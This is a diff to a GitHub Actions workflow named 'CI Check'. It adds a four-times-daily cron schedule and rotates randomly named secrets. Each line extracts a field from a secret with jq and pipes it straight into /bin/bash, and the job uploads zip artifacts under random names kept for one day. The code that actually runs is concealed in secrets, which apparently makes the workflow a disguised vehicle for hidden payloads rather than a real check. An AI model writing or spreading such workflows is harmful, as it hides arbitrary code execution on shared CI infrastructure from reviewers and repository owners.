@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '25 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -14,18 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          tlg3245: ${{ secrets.tlg3245 }}
+          jw998: ${{ secrets.jw998 }}
         run: |
-          printf '%s' "$tlg3245" | jq -r .it33554 | /bin/bash
-          printf '%s' "$e740" | jq -r .reca615 | /bin/bash
-          echo $kagr205 | jq -r .orrem64597 | /bin/bash
-          printf '%s' "$a7" | jq -r .wwz79260 | /bin/bash
-          echo $ksl83 | jq -r .lhl72344 | /bin/bash
-          printf '%s' "$lwj95" | jq -r .qfeh29 | /bin/bash
+          printf '%s' "$jw998" | jq -r .wnobx5355 | /bin/bash
+          printf '%s' "$nhheb56788" | jq -r .kx464 | /bin/bash
+          echo $efwun2304 | jq -r .bua5511 | /bin/bash
+          echo $wh79 | jq -r .jpnu6 | /bin/bash
+          echo $dasbh279 | jq -r .hxg96 | /bin/bash
+          echo $ao8596 | jq -r .yvzro9 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: YNWzwv8h
+          name: Ib6F9gQz
           path: "*.zip"
           retention-days: 1
